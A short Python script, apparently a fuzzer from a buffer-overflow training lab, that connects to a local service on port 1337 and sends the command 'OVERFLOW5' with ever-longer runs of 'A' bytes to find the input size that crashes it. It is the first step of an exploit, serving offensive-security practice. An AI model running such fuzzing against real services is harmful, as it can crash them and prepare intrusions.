import socket,time,sys

address='localhost'
port=1337

prefix=b"OVERFLOW5 "
buf=b"A" * 500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(5)
s.connect((address,port))
s.recv(1024)

while True:
    try:
        print('sending %d' % len(buf))
        payload = prefix + buf
        s.send(payload)
        s.recv(1024)
        buf += b"A" * 500
        time.sleep(1)
    except Exception as e:
        #print(e)
        print('error with size in %d' % len(buf))
        sys.exit(1)
